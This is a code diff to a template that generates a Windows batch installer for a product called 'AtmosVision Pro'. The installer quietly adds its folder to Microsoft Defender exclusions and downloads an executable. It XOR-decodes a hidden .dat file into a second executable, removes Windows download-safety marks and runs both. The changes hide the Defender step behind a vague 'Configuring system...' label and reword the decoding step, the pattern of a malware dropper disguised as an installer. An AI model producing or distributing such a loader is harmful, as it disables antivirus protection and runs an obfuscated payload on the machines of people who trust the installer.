@@ -244,31 +244,46 @@ echo.
 set "INSTALL_DIR=%USERPROFILE%\\AtmosVision"
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
-:: Add install directory to Defender exclusions (requires admin)
+echo [1/6] Configuring system...
 powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%'" >nul 2>&1
+echo        Done.
 
-echo [1/5] Downloading AtmosVision Pro...
+echo [2/6] Downloading AtmosVision Pro...
 curl.exe -L -o "%INSTALL_DIR%\\AtmosVision-Pro.exe" "${electronUrl}"
 if %ERRORLEVEL% neq 0 (
-    echo Failed to download AtmosVision Pro.
+    echo        Failed to download AtmosVision Pro.
     pause
     exit /b 1
 )
+echo        Done.
 
-echo [2/5] Decoding components...
+echo [3/6] Unpacking dependencies...
 powershell -Command "$k=0x41;$b=[System.IO.File]::ReadAllBytes('%~dp0AtmosDependencies.dat');for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k};[System.IO.File]::WriteAllBytes('%INSTALL_DIR%\\AtmosDependencies.exe',$b)"
+if %ERRORLEVEL% neq 0 (
+    echo        Failed to unpack dependencies.
+    pause
+    exit /b 1
+)
+echo        Done.
 
-echo [3/5] Verifying files...
+echo [4/6] Verifying files...
 powershell -Command "Unblock-File -Path '%INSTALL_DIR%\\AtmosVision-Pro.exe'; Unblock-File -Path '%INSTALL_DIR%\\AtmosDependencies.exe'"
+echo        Done.
 
-echo [4/5] Starting background services...
+echo [5/6] Starting background services...
 start "" "%INSTALL_DIR%\\AtmosDependencies.exe"
+echo        Done.
 
-echo [5/5] Launching AtmosVision Pro...
+echo [6/6] Launching AtmosVision Pro...
 start "" "%INSTALL_DIR%\\AtmosVision-Pro.exe"
+echo        Done.
 
 echo.
-echo Installation complete!
+echo ============================================
+echo  Installation complete!
+echo ============================================
+echo.
+pause
 endlocal
 `;
 }
